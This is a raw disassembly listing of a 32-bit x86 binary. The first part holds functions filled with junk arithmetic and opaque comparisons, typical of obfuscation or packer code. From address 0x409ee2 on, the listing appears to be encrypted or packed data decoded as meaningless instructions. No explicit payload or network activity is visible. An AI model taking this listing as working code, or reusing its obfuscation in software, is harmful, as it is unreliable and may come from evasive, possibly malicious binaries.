  409a50:	push   0xffffffe0
  409a52:	push   0xd2935900
  409a57:	push   0x5e55b900
  409a5c:	call   0x409aad
  409a61:	add    esp,0xc
  409a64:	push   0x60eee200
  409a69:	push   0xffffff84
  409a6b:	call   0x409aad
  409a70:	add    esp,0x8
  409a73:	pop    esi
  409a74:	push   0x57
  409a76:	push   0xa0f13f00
  409a7b:	push   0x80958900
  409a80:	push   0x664b6500
  409a85:	push   0xc0983400
  409a8a:	call   0x409aad
  409a8f:	add    esp,0x14
  409a92:	pop    ebx
  409a93:	push   0xfffffff7
  409a95:	push   0xffffff86
  409a97:	push   0xaa8a4600
  409a9c:	push   0xffffffcd
  409a9e:	call   0x409bc5
  409aa3:	add    esp,0x10
  409aa6:	leave  
  409aa7:	ret    
  409aa8:	int3   
  409aa9:	int3   
  409aaa:	int3   
  409aab:	int3   
  409aac:	int3   
  409aad:	push   ebp
  409aae:	mov    ebp,esp
  409ab0:	sub    esp,0x2c
  409ab3:	xor    eax,eax
  409ab5:	call   0x409d18
  409aba:	push   ebx
  409abb:	push   0x2a5da000
  409ac0:	call   0x409bc5
  409ac5:	add    esp,0x4
  409ac8:	push   esi
  409ac9:	push   0xf254f300
  409ace:	push   0x54
  409ad0:	call   0x409d18
  409ad5:	add    esp,0x8
  409ad8:	push   edi
  409ad9:	call   0x409bc5
  409ade:	mov    ecx,eax
  409ae0:	mov    DWORD PTR [ebp-0xc],eax
  409ae3:	cmp    ecx,0x8
  409ae6:	je     0x409afb
  409ae8:	push   0x17
  409aea:	push   0xffffffa7
  409aec:	push   0xd2d49700
  409af1:	push   0x6f
  409af3:	call   0x409bc5
  409af8:	add    esp,0x10
  409afb:	push   0xaabbd000
  409b00:	push   0x2c
  409b02:	call   0x409bc5
  409b07:	add    esp,0x8
  409b0a:	mov    ebx,DWORD PTR [ebp-0xc]
  409b0d:	xor    DWORD PTR [ebp-0xc],ebx
  409b10:	push   0xd2c7ed00
  409b15:	push   0x2aa6f500
  409b1a:	push   0xf2ae8600
  409b1f:	push   0x10
  409b21:	push   0x27dea00
  409b26:	call   0x409d18
  409b2b:	add    esp,0x14
  409b2e:	call   0x409bc5
  409b33:	and    eax,ebx
  409b35:	push   0x44
  409b37:	push   0x60b6d300
  409b3c:	call   0x409d18
  409b41:	add    esp,0x8
  409b44:	push   0xffffffdf
  409b46:	push   0xffffffed
  409b48:	push   0x50a78700
  409b4d:	push   0xf2e7a500
  409b52:	push   0xc248ef00
  409b57:	call   0x409d18
  409b5c:	add    esp,0x14
  409b5f:	pop    edi
  409b60:	add    eax,ebx
  409b62:	push   0x5e068c00
  409b67:	push   0xd0d90a00
  409b6c:	call   0x409bc5
  409b71:	add    esp,0x8
  409b74:	push   0x84ad00
  409b79:	push   0xb0952200
  409b7e:	push   0xffffff9b
  409b80:	call   0x409bc5
  409b85:	add    esp,0xc
  409b88:	pop    esi
  409b89:	mov    ecx,esi
  409b8b:	push   0x325ad400
  409b90:	push   0xee1a0500
  409b95:	call   0x409d18
  409b9a:	add    esp,0x8
  409b9d:	pop    ebx
  409b9e:	push   0xfffffffe
  409ba0:	push   0x43
  409ba2:	push   0xeae91700
  409ba7:	push   0x60a99e00
  409bac:	push   0xaab2c700
  409bb1:	call   0x409bc5
  409bb6:	add    esp,0x14
  409bb9:	call   0x409bc5
  409bbe:	leave  
  409bbf:	ret    
  409bc0:	int3   
  409bc1:	int3   
  409bc2:	int3   
  409bc3:	int3   
  409bc4:	int3   
  409bc5:	push   ebp
  409bc6:	mov    ebp,esp
  409bc8:	sub    esp,0x48
  409bcb:	mov    eax,0xf0f0
  409bd0:	add    eax,eax
  409bd2:	xor    ecx,ecx
  409bd4:	add    eax,eax
  409bd6:	mov    DWORD PTR [ebp-0x1c],ecx
  409bd9:	add    DWORD PTR [ebp-0x1c],eax
  409bdc:	push   ebx
  409bdd:	mov    ecx,DWORD PTR [ebp-0x1c]
  409be0:	add    ecx,eax
  409be2:	add    ecx,ecx
  409be4:	mov    edx,0x13d5
  409be9:	and    ecx,eax
  409beb:	sub    ecx,edx
  409bed:	cmp    ecx,DWORD PTR [ebp-0x8]
  409bf0:	jne    0x409c04
  409bf2:	xor    edx,edx
  409bf4:	add    DWORD PTR [ebp-0x1c],ecx
  409bf7:	xor    eax,eax
  409bf9:	sub    DWORD PTR [ebp-0x1c],eax
  409bfc:	add    edx,ecx
  409bfe:	sub    DWORD PTR [ebp-0x1c],ecx
  409c01:	add    DWORD PTR [ebp-0x1c],edx
  409c04:	push   esi
  409c05:	mov    ecx,0xd7
  409c0a:	mov    edx,DWORD PTR [ebp-0x1c]
  409c0d:	and    edx,ecx
  409c0f:	and    DWORD PTR [ebp-0x1c],edx
  409c12:	push   edi
  409c13:	mov    DWORD PTR [ebp-0x44],edx
  409c16:	and    DWORD PTR [ebp-0x44],eax
  409c19:	add    edx,eax
  409c1b:	xor    DWORD PTR [ebp-0x1c],edx
  409c1e:	mov    ebx,DWORD PTR ds:0x438450
  409c24:	mov    edi,DWORD PTR [ebp-0x44]
  409c27:	mov    DWORD PTR [ebp-0x44],edi
  409c2a:	and    ebx,eax
  409c2c:	mov    DWORD PTR [ebp-0x2c],ebx
  409c2f:	mov    ebx,0x3c
  409c34:	add    DWORD PTR [ebp-0x44],eax
  409c37:	sub    ebx,edi
  409c39:	add    DWORD PTR [ebp-0x1c],ebx
  409c3c:	pop    edi
  409c3d:	sub    DWORD PTR [ebp-0x44],edi
  409c40:	pop    esi
  409c41:	cmp    esi,DWORD PTR ds:0x438450
  409c47:	jne    0x409c56
  409c49:	mov    ecx,DWORD PTR [ebp-0x1c]
  409c4c:	add    DWORD PTR [ebp-0x44],esi
  409c4f:	mov    eax,ebx
  409c51:	sub    eax,ecx
  409c53:	sub    DWORD PTR [ebp-0x44],eax
  409c56:	pop    ebx
  409c57:	sub    edx,ecx
  409c59:	or     edx,ecx
  409c5b:	mov    eax,DWORD PTR [ebp-0x2c]
  409c5e:	mov    ecx,0x86
  409c63:	and    eax,ebx
  409c65:	cmp    eax,DWORD PTR [ebp-0x20]
  409c68:	jne    0x409d11
  409c6e:	add    DWORD PTR [ebp-0x2c],eax
  409c71:	xor    eax,eax
  409c73:	cmp    edx,edi
  409c75:	je     0x409d11
  409c7b:	sub    DWORD PTR [ebp-0x44],ecx
  409c7e:	mov    ecx,edi
  409c80:	cmp    edx,0x1f
  409c83:	jne    0x409d11
  409c89:	and    ecx,esi
  409c8b:	sub    DWORD PTR [ebp-0x1c],ecx
  409c8e:	cmp    edx,0x598e
  409c94:	jne    0x409d11
  409c96:	mov    ecx,edx
  409c98:	sub    DWORD PTR [ebp-0x44],eax
  409c9b:	cmp    edx,0x48
  409c9e:	jne    0x409d11
  409ca0:	cmp    ecx,0x2b
  409ca3:	jne    0x409d11
  409ca5:	mov    eax,DWORD PTR ds:0x438450
  409cab:	sub    eax,ebx
  409cad:	test   eax,0x5f
  409cb2:	je     0x409d11
  409cb4:	mov    edx,eax
  409cb6:	add    DWORD PTR [ebp-0x2c],edx
  409cb9:	and    ecx,esi
  409cbb:	mov    eax,DWORD PTR [ebp-0x2c]
  409cbe:	add    ecx,ecx
  409cc0:	cmp    esi,0x377f
  409cc6:	je     0x409d11
  409cc8:	sub    ecx,edx
  409cca:	mov    edx,DWORD PTR [ebp-0x2c]
  409ccd:	cmp    edx,0x53
  409cd0:	je     0x409d11
  409cd2:	test   eax,0x94
  409cd7:	je     0x409d11
  409cd9:	sub    DWORD PTR [ebp-0x1c],edx
  409cdc:	mov    edx,DWORD PTR [ebp-0x2c]
  409cdf:	cmp    eax,DWORD PTR ds:0x438450
  409ce5:	jne    0x409d11
  409ce7:	cmp    eax,edx
  409ce9:	je     0x409d11
  409ceb:	cmp    ecx,0x8b31
  409cf1:	je     0x409d11
  409cf3:	cmp    edx,DWORD PTR ds:0x438450
  409cf9:	jne    0x409d11
  409cfb:	sub    DWORD PTR [ebp-0x44],ecx
  409cfe:	mov    ecx,DWORD PTR [ebp-0x44]
  409d01:	add    eax,ebx
  409d03:	mov    DWORD PTR [ebp-0x1c],ecx
  409d06:	sub    DWORD PTR [ebp-0x1c],eax
  409d09:	cmp    edx,0xa
  409d0c:	jne    0x409d11
  409d0e:	mov    DWORD PTR [ebp-0x44],edx
  409d11:	leave  
  409d12:	ret    
  409d13:	int3   
  409d14:	int3   
  409d15:	int3   
  409d16:	int3   
  409d17:	int3   
  409d18:	push   ebp
  409d19:	mov    ebp,esp
  409d1b:	sub    esp,0x38
  409d1e:	mov    eax,0x45
  409d23:	mov    ecx,0x60
  409d28:	mov    DWORD PTR [ebp-0x18],eax
  409d2b:	add    DWORD PTR [ebp-0x18],eax
  409d2e:	xor    DWORD PTR [ebp-0x18],ecx
  409d31:	push   ebx
  409d32:	and    DWORD PTR [ebp-0x18],eax
  409d35:	push   esi
  409d36:	mov    ecx,0x67d1
  409d3b:	or     DWORD PTR [ebp-0x18],eax
  409d3e:	mov    esi,DWORD PTR [ebp-0x18]
  409d41:	sub    ecx,eax
  409d43:	cmp    esi,0xffffff9c
  409d46:	jne    0x409d53
  409d48:	test   esi,0x10400
  409d4e:	je     0x409d53
  409d50:	sub    DWORD PTR [ebp-0x18],esi
  409d53:	and    ecx,esi
  409d55:	cmp    ecx,0xffffffc4
  409d58:	je     0x409d7c
  409d5a:	mov    esi,0x73d2
  409d5f:	mov    esi,DWORD PTR [ebp-0x18]
  409d62:	or     DWORD PTR [ebp-0x18],esi
  409d65:	cmp    ecx,0xa0d1
  409d6b:	jne    0x409d7c
  409d6d:	xor    eax,eax
  409d6f:	mov    esi,DWORD PTR [ebp-0x18]
  409d72:	add    ecx,esi
  409d74:	add    DWORD PTR [ebp-0x18],ecx
  409d77:	add    eax,esi
  409d79:	sub    DWORD PTR [ebp-0x18],eax
  409d7c:	push   edi
  409d7d:	mov    DWORD PTR [ebp-0x18],eax
  409d80:	xor    ebx,ebx
  409d82:	mov    edx,esi
  409d84:	add    edx,esi
  409d86:	cmp    esi,0x10
  409d89:	jne    0x409d90
  409d8b:	add    edx,ebx
  409d8d:	sub    DWORD PTR [ebp-0x18],edx
  409d90:	mov    edx,0xf5fa
  409d95:	xor    ecx,ecx
  409d97:	add    edx,ebx
  409d99:	xor    DWORD PTR [ebp-0x18],edx
  409d9c:	sub    DWORD PTR [ebp-0x18],esi
  409d9f:	test   eax,0xa2
  409da4:	jne    0x409ddc
  409da6:	add    DWORD PTR [ebp-0x18],esi
  409da9:	xor    eax,eax
  409dab:	mov    esi,DWORD PTR [ebp-0x18]
  409dae:	cmp    esi,0x41
  409db1:	jne    0x409ddc
  409db3:	add    ecx,eax
  409db5:	add    esi,eax
  409db7:	mov    eax,DWORD PTR [ebp-0x18]
  409dba:	mov    edi,DWORD PTR [ebp-0x18]
  409dbd:	add    edi,edx
  409dbf:	sub    DWORD PTR [ebp-0x18],edi
  409dc2:	cmp    esi,ecx
  409dc4:	je     0x409ddc
  409dc6:	mov    ebx,DWORD PTR [ebp-0x18]
  409dc9:	add    DWORD PTR [ebp-0x18],eax
  409dcc:	mov    edx,DWORD PTR [ebp-0x18]
  409dcf:	add    ebx,ebx
  409dd1:	sub    DWORD PTR [ebp-0x18],esi
  409dd4:	and    DWORD PTR [ebp-0x18],ebx
  409dd7:	add    edx,ecx
  409dd9:	add    DWORD PTR [ebp-0x18],edx
  409ddc:	mov    eax,0xd5
  409de1:	sub    eax,ecx
  409de3:	cmp    esi,DWORD PTR [ebp-0x8]
  409de6:	jne    0x409e19
  409de8:	and    eax,esi
  409dea:	sub    eax,edx
  409dec:	cmp    eax,DWORD PTR [ebp-0x8]
  409def:	jne    0x409e19
  409df1:	mov    edi,0x35
  409df6:	sub    eax,edi
  409df8:	mov    esi,DWORD PTR ds:0x438460
  409dfe:	mov    DWORD PTR [ebp-0x18],eax
  409e01:	and    esi,ecx
  409e03:	mov    DWORD PTR [ebp-0x18],edi
  409e06:	add    DWORD PTR [ebp-0x18],edi
  409e09:	cmp    ebx,DWORD PTR ds:0x438460
  409e0f:	je     0x409e16
  409e11:	sub    edx,ebx
  409e13:	sub    DWORD PTR [ebp-0x18],edx
  409e16:	mov    DWORD PTR [ebp-0x18],esi
  409e19:	mov    edi,DWORD PTR [ebp-0x18]
  409e1c:	mov    edx,0x37
  409e21:	and    edx,ecx
  409e23:	sub    edx,edi
  409e25:	add    edx,ecx
  409e27:	cmp    edx,0x48
  409e2a:	je     0x409e48
  409e2c:	mov    ecx,DWORD PTR [ebp-0x18]
  409e2f:	mov    DWORD PTR [ebp-0x18],edx
  409e32:	add    DWORD PTR [ebp-0x18],edi
  409e35:	cmp    ecx,edx
  409e37:	je     0x409e48
  409e39:	add    DWORD PTR [ebp-0x18],edi
  409e3c:	xor    edi,edi
  409e3e:	add    edi,eax
  409e40:	add    edi,esi
  409e42:	add    DWORD PTR [ebp-0x18],edi
  409e45:	add    DWORD PTR [ebp-0x18],ecx
  409e48:	mov    ecx,DWORD PTR [ebp-0x18]
  409e4b:	sub    DWORD PTR [ebp-0x18],ebx
  409e4e:	add    DWORD PTR [ebp-0x18],ecx
  409e51:	pop    edi
  409e52:	cmp    edi,DWORD PTR ds:0x438460
  409e58:	jne    0x409e65
  409e5a:	cmp    edi,DWORD PTR ds:0x438460
  409e60:	jne    0x409e65
  409e62:	and    DWORD PTR [ebp-0x18],eax
  409e65:	pop    esi
  409e66:	test   esi,0x609150b1
  409e6c:	jne    0x409eda
  409e6e:	mov    eax,DWORD PTR [ebp-0x18]
  409e71:	and    eax,ecx
  409e73:	sub    DWORD PTR [ebp-0x18],esi
  409e76:	cmp    eax,0x14
  409e79:	je     0x409eda
  409e7b:	mov    edx,0x8fa6
  409e80:	add    DWORD PTR [ebp-0x18],edi
  409e83:	cmp    ebx,0x3625
  409e89:	jne    0x409eda
  409e8b:	add    edx,ebx
  409e8d:	mov    ebx,DWORD PTR [ebp-0x18]
  409e90:	mov    ecx,esi
  409e92:	cmp    edx,0x5c
  409e95:	je     0x409eda
  409e97:	add    DWORD PTR [ebp-0x18],edx
  409e9a:	cmp    ebx,0x6ed7
  409ea0:	je     0x409eda
  409ea2:	add    DWORD PTR [ebp-0x18],edi
  409ea5:	mov    edx,DWORD PTR [ebp-0x18]
  409ea8:	mov    DWORD PTR [ebp-0x18],eax
  409eab:	cmp    ecx,0xfffffffc
  409eae:	je     0x409eda
  409eb0:	mov    eax,DWORD PTR [ebp-0x18]
  409eb3:	test   edx,0xab
  409eb9:	jne    0x409eda
  409ebb:	add    ebx,edi
  409ebd:	cmp    edx,0x2300480
  409ec3:	jne    0x409eda
  409ec5:	mov    DWORD PTR [ebp-0x18],ebx
  409ec8:	sub    DWORD PTR [ebp-0x18],ecx
  409ecb:	mov    ebx,ecx
  409ecd:	or     DWORD PTR [ebp-0x18],edx
  409ed0:	add    eax,eax
  409ed2:	and    DWORD PTR [ebp-0x18],eax
  409ed5:	add    ebx,ebx
  409ed7:	add    DWORD PTR [ebp-0x18],ebx
  409eda:	pop    ebx
  409edb:	and    edx,edi
  409edd:	sub    DWORD PTR [ebp-0x18],edx
  409ee0:	leave  
  409ee1:	ret    
  409ee2:	add    BYTE PTR [eax],al
  409ee4:	sub    DWORD PTR [ebx-0xb343b87],edi
  409eea:	mov    edi,cs
  409eec:	or     eax,edi
  409eee:	jns    0x409f3b
  409ef0:	fcom   QWORD PTR [ebx-0x4]
  409ef3:	xchg   esi,eax
  409ef4:	jp     0x409ed0
  409ef6:	cmp    al,0x4a
  409ef8:	pop    ss
  409ef9:	lds    esi,FWORD PTR [esi-0x5cf544f4]
  409eff:	inc    edx
  409f00:	es sbb al,0x62
  409f03:	jnp    0x409f40
  409f05:	add    BYTE PTR [edx-0x5731916c],dh
  409f0b:	add    cl,cl
  409f0d:	jle    0x409f42
  409f0f:	sar    BYTE PTR [edx],1
  409f11:	jo     0x409ed0
  409f13:	mov    cl,0x74
  409f15:	pop    ds
  409f16:	aad    0xc1
  409f18:	jmp    0x183f:0xd4de4992
  409f1f:	in     al,0xde
  409f21:	pop    DWORD PTR [edi-0x26]
  409f24:	in     al,0x92
  409f26:	inc    esp
  409f27:	out    0x71,eax
  409f29:	and    eax,0x79
  409f2c:	jno    0x409ec5
  409f2e:	mov    al,ds:0x931f932e
  409f33:	jns    0x409fa6
  409f35:	stos   DWORD PTR es:[edi],eax
  409f36:	and    BYTE PTR [ecx+0x74d51fbd],ah
  409f3c:	jno    0x409ec8
  409f3e:	cmp    ah,bh
  409f40:	fild   WORD PTR [ecx+eax*2+0x394da3a8]
  409f47:	loope  0x409f26
  409f49:	pop    ds
  409f4a:	inc    ebx
  409f4b:	jmp    0xa3822b25
  409f50:	aad    0x8b
  409f52:	inc    ecx
  409f53:	jne    0x409f1b
  409f55:	stos   BYTE PTR es:[edi],al
  409f56:	rcl    ebp,0xa4
  409f59:	fbld   TBYTE PTR [eax-0x36]
  409f5c:	jns    0x409f08
  409f5e:	and    al,BYTE PTR [ecx+0x7f4ae7ac]
  409f64:	cld    
  409f65:	sbb    DWORD PTR [edx+ebp*8+0x44606f6e],eax
  409f6c:	pushf  
  409f6d:	jmp    0x21e3e53e
  409f72:	pop    ss
  409f73:	sub    BYTE PTR [ecx-0x10],bh
  409f76:	mov    ebp,0xf55476e8
  409f7b:	imul   DWORD PTR [ecx]
  409f7d:	or     eax,0x12e640d4
  409f82:	mov    eax,0x5ef06861
  409f87:	mov    ecx,0x3e363b95
  409f8c:	xor    ebp,DWORD PTR [eax]
  409f8e:	aad    0xc9
  409f90:	cld    
  409f91:	or     edx,DWORD PTR [edi+0x39]
  409f94:	imul   ebx,DWORD PTR [esi],0xe6d174d5
  409f9a:	pop    edx
  409f9b:	ins    DWORD PTR es:[edi],dx
  409f9c:	outs   dx,DWORD PTR ds:[esi]
  409f9d:	pop    ds
  409f9e:	aad    0x75
  409fa0:	jno    0x409fc1
  409fa2:	aad    0xf7
  409fa4:	out    dx,al
  409fa5:	daa    
  409fa6:	aad    0x83
  409fa8:	cmc    
  409fa9:	(bad)  
  409faa:	aad    0x74
  409fac:	jno    0x409f58
  409fae:	dec    edx
  409faf:	jge    0x409faf
  409fb1:	(bad)  
  409fb3:	jae    0x40a025
  409fb5:	pop    ds
  409fb6:	(bad)  
  409fb7:	jne    0x40a02b
  409fb9:	pop    ds
  409fba:	aad    0x20
  409fbc:	lods   eax,DWORD PTR ds:[esi]
  409fbd:	pusha  
  409fbe:	inc    edi
  409fbf:	jnp    0x409f6e
  409fc1:	jns    0x40a00f
  409fc3:	ja     0x409f62
  409fc5:	(bad)  
  409fc6:	jg     0x40a047
  409fc8:	xor    DWORD PTR [esi+ebx*8+0x57a380bd],edx
  409fcf:	jne    0x40a042
  409fd1:	pop    ds
  409fd2:	rcr    BYTE PTR [esi+edi*8-0x2c],0xd5
  409fd7:	jae    0x40a049
  409fd9:	pop    ds
  409fda:	add    DWORD PTR [ebx-0xc],esi
  409fdd:	push   ds
  409fde:	xlat   BYTE PTR ds:[ebx]
  409fdf:	jmp    0x8b59:0xcad589e4
  409fe6:	aam    0x74
  409fe8:	jo     0x409f93
  409fea:	pop    edx
  409feb:	jno    0x40a05c
  409fed:	pop    ds
  409fee:	aad    0xd9
  409ff0:	cld    
  409ff1:	xor    al,0x5
  409ff3:	jne    0x40a066
  409ff5:	pop    ds
  409ff6:	pusha  
  409ff7:	(bad)  
  409ff8:	jge    0x409fa4
  409ffa:	daa    
  409ffb:	cmp    esp,0xfc7bc0f9
  40a001:	xor    DWORD PTR [eax],edx
  40a003:	dec    eax
  40a004:	in     eax,0x6d
  40a006:	pusha  
  40a007:	out    0xa1,eax
  40a009:	lods   al,BYTE PTR ds:[esi]
  40a00a:	xchg   edx,eax
  40a00b:	jne    0x40a07d
  40a00d:	pop    ds
  40a00e:	aad    0x2e
  40a010:	jno    0x40a032
  40a012:	aad    0x74
  40a014:	jl     0x40a02b
  40a016:	dec    edx
  40a017:	pop    ebp
  40a018:	xlat   BYTE PTR ds:[ebx]
  40a019:	int3   
  40a01a:	adc    DWORD PTR [esi-0x30eeda1d],esi
  40a020:	call   0x1b95a146
  40a025:	sub    dl,BYTE PTR [ebp+0x496876e9]
  40a02b:	dec    ecx
  40a02c:	pop    esp
  40a02d:	or     ah,BYTE PTR [ebx+0x2a]
  40a030:	jno    0x40a050
  40a032:	aad    0x74
  40a034:	pushf  
  40a035:	sbb    eax,0x95727459
  40a03a:	call   0x7086:0xbd7571df
  40a041:	pop    ds
  40a042:	aad    0xb0
  40a044:	neg    BYTE PTR [ebx]
  40a046:	aam    0x74
  40a048:	jo     0x409fdf
  40a04a:	mov    al,BYTE PTR [eax]
  40a04c:	mov    bl,0x37
  40a04e:	pop    esi
  40a04f:	cli    
  40a050:	imul   ebx,DWORD PTR [esi],0xaad274d5
  40a056:	pop    edx
  40a057:	ins    DWORD PTR es:[edi],dx
  40a058:	outs   dx,DWORD PTR ds:[esi]
  40a059:	pop    ds
  40a05a:	aad    0x3e
  40a05c:	xor    esp,DWORD PTR [edx*8+0x90bfcc9]
  40a063:	xor    eax,0x7d1a58d1
  40a068:	in     eax,0x69
  40a06a:	pusha  
  40a06b:	sar    BYTE PTR [ecx+0x22],cl
  40a06e:	xor    BYTE PTR [ecx+0x784d7afc],dh
  40a074:	into   
  40a075:	daa    
  40a076:	pusha  
  40a077:	call   0x7d8ac30d
  40a07c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a07d:	icebp  
  40a07e:	adc    al,cl
  40a080:	mov    DWORD PTR [edx+0x64742206],edx
  40a086:	fstp   st(6)
  40a088:	jno    0x40a0f9
  40a08a:	mov    ebp,0xd51f6f3a
  40a08f:	scas   al,BYTE PTR es:[edi]
  40a090:	mov    dh,0x2b
  40a092:	dec    ecx
  40a093:	js     0x40a048
  40a095:	or     bh,BYTE PTR [ebp+0x28235346]
  40a09b:	cdq    
  40a09c:	je     0x40a112
  40a09e:	fld    QWORD PTR [ebx+0x55962228]
  40a0a4:	jae    0x40a0c8
  40a0a6:	sbb    BYTE PTR [ecx-0x229b8c],dl
  40a0ac:	jno    0x40a0d0
  40a0ae:	sbb    bh,BYTE PTR [ebp-0x6]
  40a0b1:	arpl   cx,di
  40a0b3:	nop
  40a0b4:	shr    al,cl
  40a0b6:	xchg   edi,eax
  40a0b7:	jge    0x40a12a
  40a0b9:	je     0x40a11b
  40a0bb:	popa   
  40a0bc:	jo     0x40a053
  40a0be:	loope  0x40a133
  40a0c0:	out    0x27,al
  40a0c2:	mov    ebp,0xd51f700d
  40a0c7:	ds clc 
  40a0c9:	and    edi,ecx
  40a0cb:	sti    
  40a0cc:	mov    ch,0x43
  40a0ce:	fnsave [esi]
  40a0d0:	jne    0x40a0f1
  40a0d2:	sub    al,BYTE PTR [eax]
  40a0d4:	pop    ebp
  40a0d5:	mov    ds:0x7d16199,eax
  40a0da:	(bad)  
  40a0db:	je     0x40a14e
  40a0dd:	pop    ds
  40a0de:	push   esi
  40a0df:	mov    eax,ds:0xb4e8b195
  40a0e4:	jno    0x40a160
  40a0e6:	(bad)  
  40a0e7:	clc    
  40a0e8:	outs   dx,DWORD PTR ds:[esi]
  40a0e9:	xor    DWORD PTR ds:0x7307c175,edx
  40a0ef:	jae    0x40a161
  40a0f1:	pop    ds
  40a0f2:	pop    edi
  40a0f3:	mov    edx,0xe5ac886d
  40a0f8:	adc    eax,0x6dead457
  40a0fd:	or     BYTE PTR [ebx],dh
  40a0ff:	je     0x40a171
  40a101:	pop    ds
  40a102:	pop    edi
  40a103:	mov    edx,0x61f8869
  40a108:	or     BYTE PTR [edi],dl
  40a10a:	aad    0xea
  40a10c:	ins    DWORD PTR es:[edi],dx
  40a10d:	or     BYTE PTR [ebx],ah
  40a10f:	je     0x40a181
  40a111:	pop    ds
  40a112:	pop    edi
  40a113:	mov    edx,0x711aab65
  40a118:	je     0x40a179
  40a11a:	adc    DWORD PTR [eax+ebp*1-0x4afe1690],eax
  40a121:	and    ebp,ebp
  40a123:	inc    ecx
  40a125:	sub    ebx,eax
  40a127:	leave  
  40a128:	ins    DWORD PTR es:[edi],dx
  40a129:	test   eax,0x6f74652a
  40a12e:	in     eax,0xfd
  40a130:	(bad)  
  40a131:	or     esp,DWORD PTR [ecx-0xe]
  40a134:	pop    ebp
  40a135:	stos   DWORD PTR es:[edi],eax
  40a136:	dec    edx
  40a137:	lods   al,BYTE PTR gs:[esi]
  40a139:	push   ss
  40a13a:	dec    edx
  40a13b:	ficomp DWORD PTR ds:0x68eabd5c
  40a141:	stos   DWORD PTR es:[edi],eax
  40a142:	fild   DWORD PTR [ecx]
  40a144:	mov    ch,0x4f
  40a146:	fldcw  WORD PTR [edi+0x614b17b6]
  40a14c:	sub    al,BYTE PTR [eax-0x2b]
  40a14f:	je     0x40a1c2
  40a151:	lods   al,BYTE PTR ds:[esi]
  40a152:	sub    esi,DWORD PTR [edx-0x45]
  40a155:	test   DWORD PTR [esi-0x51],edx
  40a158:	fld    TBYTE PTR [eax]
  40a15a:	dec    ecx
  40a15b:	jns    0x40a1b0
  40a15d:	push   ss
  40a15e:	ror    DWORD PTR [ebp-0x45],0x9f
  40a162:	minps  xmm4,xmm6
  40a165:	aaa    
  40a166:	pusha  
  40a167:	mov    edi,0x8621ac72
  40a16c:	jbe    0x40a1c8
  40a16e:	and    ah,BYTE PTR [ebp-0x1d]
  40a171:	sub    edx,DWORD PTR [eax]
  40a173:	ret    0x935d
  40a176:	fsubr  QWORD PTR [edi+0x774a13be]
  40a17c:	pop    esp
  40a17d:	ficom  DWORD PTR [esi-0x51]
  40a180:	add    DWORD PTR [eax+0x35e50565],esi
  40a186:	pusha  
  40a187:	ja     0x40a11f
  40a189:	shufps xmm4,XMMWORD PTR [ebp+0x61],0x5d
  40a18e:	and    eax,0x4a6fc1c5
  40a193:	jnp    0x40a186
  40a195:	cdq    
  40a196:	shl    DWORD PTR [eax-0x1b],cl
  40a199:	and    al,0xc0
  40a19b:	cmp    esp,esi
  40a19d:	loope  0x40a178
  40a19f:	jae    0x40a1e4
  40a1a1:	sbb    DWORD PTR [esi+0x2a1f7537],0x60805d00
  40a1ab:	jmp    0xd26d:0x7d52aa7d
  40a1b2:	push   ebp
  40a1b3:	test   al,0x4c
  40a1b5:	les    ecx,FWORD PTR [eax-0x2a72a689]
  40a1bb:	je     0x40a22e
  40a1bd:	xchg   edx,eax
  40a1be:	retf   
  40a1bf:	test   al,0x3a
  40a1c1:	or     BYTE PTR [edx],bh
  40a1c3:	jne    0x40a236
  40a1c5:	pop    ds
  40a1c6:	dec    eax
  40a1c7:	xchg   ecx,eax
  40a1c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1c9:	fistp  QWORD PTR [ebp-0x2ae08e30]
  40a1cf:	out    0x94,eax
  40a1d1:	rcl    bh,cl
  40a1d3:	mov    ch,0x21
  40a1d5:	xor    BYTE PTR [ebp-0x2ae08e3c],bh
  40a1db:	xchg   BYTE PTR [ecx],dh
  40a1dd:	xchg   ebx,eax
  40a1de:	int3   
  40a1df:	jmp    0x6d59:0x49c0c9b0
  40a1e6:	aad    0x74
  40a1e8:	jno    0x40a234
  40a1ea:	mov    al,ds:0x180781ea
  40a1ef:	jne    0x40a262
  40a1f1:	pop    ds
  40a1f2:	rcr    BYTE PTR [ebp-0x16420ee3],0xbe
  40a1f9:	xor    bl,BYTE PTR [esi+0x1db08d60]
  40a1ff:	ss push ecx
  40a201:	sub    BYTE PTR [ecx-0x2ae062a3],al
  40a207:	je     0x40a1b7
  40a209:	pop    ds
  40a20a:	push   edx
  40a20b:	jne    0x40a27e
  40a20d:	xchg   edx,eax
  40a20e:	fcomip st,st(4)
  40a210:	ins    DWORD PTR es:[edi],dx
  40a211:	and    eax,0x17f47b48
  40a216:	push   ebp
  40a217:	in     al,dx
  40a218:	jae    0x40a27a
  40a21a:	push   ss
  40a21b:	or     bh,ah
  40a21d:	in     al,0x88
  40a21f:	jbe    0x40a1e8
  40a221:	stos   BYTE PTR es:[edi],al
  40a222:	int3   
  40a223:	mov    al,ds:0xd37a1361
  40a228:	pop    esp
  40a229:	scas   al,BYTE PTR es:[edi]
  40a22a:	xlat   BYTE PTR ds:[ebx]
  40a22b:	inc    esi
  40a22c:	out    0x24,al
  40a22e:	pop    edi
  40a22f:	mov    esi,DWORD PTR [edi-0x5bc758cf]
  40a235:	call   0x1f9fff50
  40a23a:	aad    0x74
  40a23c:	test   al,ch
  40a23e:	mov    ebp,0xd51f705c
  40a243:	out    0x63,eax
  40a245:	jecxz  0x40a247
  40a247:	icebp  
  40a248:	xchg   ebp,eax
  40a249:	inc    edi
  40a24a:	pop    esi
  40a24b:	icebp  
  40a24c:	xchg   ebp,eax
  40a24d:	cmp    esi,DWORD PTR [esi]
  40a24f:	xor    ebp,DWORD PTR ds:[eax]
  40a252:	aad    0xc9
  40a254:	cld    
  40a255:	or     ebx,DWORD PTR [ecx+0x39]
  40a258:	popa   
  40a259:	and    BYTE PTR [eax-0x46],0x79
  40a25d:	inc    esp
  40a25e:	aad    0x64
  40a260:	jo     0x40a281
  40a262:	cmp    al,0xf6
  40a264:	test   eax,0x84ea2f6c
  40a269:	stos   BYTE PTR es:[edi],al
  40a26a:	and    eax,0xd619f2b1
  40a26f:	test   BYTE PTR [ecx+0x1f],dh
  40a272:	dec    eax
  40a273:	jge    0x40a24c
  40a275:	mov    al,ds:0x64c17711
  40a27a:	dec    ecx
  40a27b:	jl     0x40a21b
  40a27d:	pop    ds
  40a27e:	in     eax,0x74
  40a280:	jno    0x40a28c
  40a282:	mov    ch,0xfe
  40a284:	mov    dh,0x27
  40a286:	mov    ebp,0xd51f7175
  40a28b:	cmc    
  40a28c:	popf   
  40a28d:	inc    ebx
